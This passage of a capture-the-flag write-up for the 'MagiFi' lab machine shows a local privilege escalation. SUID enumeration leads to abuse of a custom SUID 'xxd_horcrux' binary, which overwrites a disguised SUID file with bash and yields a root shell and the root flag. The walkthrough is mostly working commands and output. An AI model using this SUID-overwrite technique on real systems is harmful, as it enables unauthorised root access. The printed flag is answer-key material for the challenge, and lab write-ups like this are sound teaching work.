tom.riddle@MagiFi:~$ id
uid=1004(tom.riddle) gid=1004(tom.riddle) groups=1004(tom.riddle)

tom.riddle@MagiFi:~$ find . -type f -ls
   344451      4 -rw-r--r--   1 tom.riddle tom.riddle      220 Feb 25  2020 ./.bash_logout
   344452      4 -rw-r--r--   1 tom.riddle tom.riddle     3771 Feb 25  2020 ./.bashrc
   336671     20 -rwsr-x--x   1 root       tom.riddle    17136 Sep 29 18:40 ./.horcrux.png
   344453      4 -rw-r--r--   1 tom.riddle tom.riddle      807 Feb 25  2020 ./.profile
   271659      0 -rw-r--r--   1 tom.riddle tom.riddle        0 Feb  4  2025 ./.cache/motd.legal-displayed

tom.riddle@MagiFi:~$ find / -perm -4000 -ls 2>/dev/null | grep -v snap
   262629     88 -rwsr-xr-x   1 root     root        88464 Feb  6  2024 /usr/bin/gpasswd
   262241     84 -rwsr-xr-x   1 root     root        85064 Feb  6  2024 /usr/bin/chfn
   262712     40 -rwsr-xr-x   1 root     root        39144 Apr  9  2024 /usr/bin/umount
   275948     44 -rwsr-xr-x   1 root     root        44784 Feb  6  2024 /usr/bin/newgrp
   345098     20 -rwsr-xr-x   1 root     root        17400 Feb 13  2025 /usr/bin/xxd_horcrux
   276704     68 -rwsr-xr-x   1 root     root        67816 Apr  9  2024 /usr/bin/su
   262825     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
   262644     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
   263044     32 -rwsr-xr-x   1 root     root        31032 Feb 21  2022 /usr/bin/pkexec
   271591    164 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /usr/bin/sudo
   262707     56 -rwsr-xr-x   1 root     root        55528 Apr  9  2024 /usr/bin/mount
   262715     68 -rwsr-xr-x   1 root     root        68208 Feb  6  2024 /usr/bin/passwd
   262242     52 -rwsr-xr-x   1 root     root        53040 Feb  6  2024 /usr/bin/chsh
   263530     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   283335    468 -rwsr-xr-x   1 root     root       477672 Apr 11 12:16 /usr/lib/openssh/ssh-keysign
   263738     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   345093     12 -rwsr-xr-x   1 root     root        10224 Jan 22  2017 /usr/lib/authbind/helper
   263523     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   336671     20 -rwsr-x--x   1 root     tom.riddle         17136 Sep 29 18:41 /home/tom.riddle/.horcrux.png
```

`./.horcrux.png` file a SUID file and there's also SUID `/usr/bin/xxd_horcrux` binary.

`PNG` file is definitely not an image file ðŸ¤”
```bash
tom.riddle@MagiFi:~$ file .horcrux.png
.horcrux.png: setuid data
tom.riddle@MagiFi:~$ xxd .horcrux.png | head
00000000: 8950 4e47 0201 0100 0000 0000 0000 0000  .PNG............
00000010: 0300 3e00 0100 0000 a011 0000 0000 0000  ..>.............
00000020: 4000 0000 0000 0000 303b 0000 0000 0000  @.......0;......
00000030: 0000 0000 4000 3800 0d00 4000 1f00 1e00  ....@.8...@.....
00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 0000 0000 0000 4000 0000 0000 0000  @.......@.......
00000060: d802 0000 0000 0000 d802 0000 0000 0000  ................
00000070: 0800 0000 0000 0000 0300 0000 0400 0000  ................
00000080: 1803 0000 0000 0000 1803 0000 0000 0000  ................
00000090: 1803 0000 0000 0000 1c00 0000 0000 0000  ................
tom.riddle@MagiFi:~$ xxd .horcrux.png | tail
00004250: 0807 0000 0000 0000 1d00 0000 2e00 0000  ................
00004260: 0800 0000 0000 0000 1800 0000 0000 0000  ................
00004270: 0900 0000 0300 0000 0000 0000 0000 0000  ................
00004280: 0000 0000 0000 0000 4837 0000 0000 0000  ........H7......
00004290: ce02 0000 0000 0000 0000 0000 0000 0000  ................
000042a0: 0100 0000 0000 0000 0000 0000 0000 0000  ................
000042b0: 1100 0000 0300 0000 0000 0000 0000 0000  ................
000042c0: 0000 0000 0000 0000 163a 0000 0000 0000  .........:......
000042d0: 1a01 0000 0000 0000 0000 0000 0000 0000  ................
000042e0: 0100 0000 0000 0000 0000 0000 0000 0000  ................
```

If we make binary hex and them make SUID binary convert it to "horcrux" it doesn't work and just hangs.
```bash
tom.riddle@MagiFi:~$ xxd /bin/bash > /tmp/bash
tom.riddle@MagiFi:~$ xxd_horcrux -r /tmp/bash -O .horcrux.png
# Hangs
```

If we change magic bytes from PNG to ELF it returns an actual binary and I think it's just running bash.
```bash
tom.riddle@MagiFi:~$ cp .horcrux.png /tmp/test
tom.riddle@MagiFi:~$ printf '\x7fELF' | dd of=/tmp/test bs=1 count=4 conv=notrunc status=none
tom.riddle@MagiFi:~$ file /tmp/test
/tmp/test: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=726d434af07a44637117b403a1b829eafaabdcc6, for GNU/Linux 3.2.0, not stripped

tom.riddle@MagiFi:~$ strings /tmp/test | grep bin
/bin/bash
```

Hmmm... if we reverse the steps and use `xxd_horcrux` we are able  to recreate `.horcrux.png` however it's still PNG.
```bash
tom.riddle@MagiFi:~$ cp /bin/bash /tmp/bash
tom.riddle@MagiFi:~$ printf '\x89PNG' | dd of=/tmp/bash bs=1 count=4 conv=notrunc status=none
tom.riddle@MagiFi:~$ xxd /tmp/bash > /tmp/bash.hex
tom.riddle@MagiFi:~$ xxd_horcrux -r /tmp/bash.hex -O .horcrux.png
# Doesnt hang
tom.riddle@MagiFi:~$ ls -alh ~/.horcrux.png
-rwsr-x--x 1 root tom.riddle 1.2M Sep 29 19:04 /home/tom.riddle/.horcrux.png
tom.riddle@MagiFi:~$ file ~/.horcrux.png
/home/tom.riddle/.horcrux.png: setuid data
```

Some weird flex is added, if filename is not exactly `.horcrux.png` it doesn't work..
```bash
tom.riddle@MagiFi:~$ xxd /tmp/rootbash | xxd_horcrux -r -O ~/.horcrux.png
Not every wizards can use or destroy a Horcrux!

tom.riddle@MagiFi:~$ xxd /tmp/rootbash | xxd_horcrux -r -O .horcrux.png
# Works
```

```bash
tom.riddle@MagiFi:~$ cp .horcrux.png rootbash
tom.riddle@MagiFi:~$ printf '\x7fELF' | dd of=rootbash bs=1 count=4 conv=notrunc status=none
tom.riddle@MagiFi:~$ xxd rootbash | xxd_horcrux -r -O .horcrux.png
tom.riddle@MagiFi:~$ ./.horcrux.png
root@MagiFi:~# id
uid=0(root) gid=0(root) groups=0(root),1004(tom.riddle)
```

### Root.txt

```
root@MagiFi:~# cat /root/root_flag_as5df.txt
hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}
```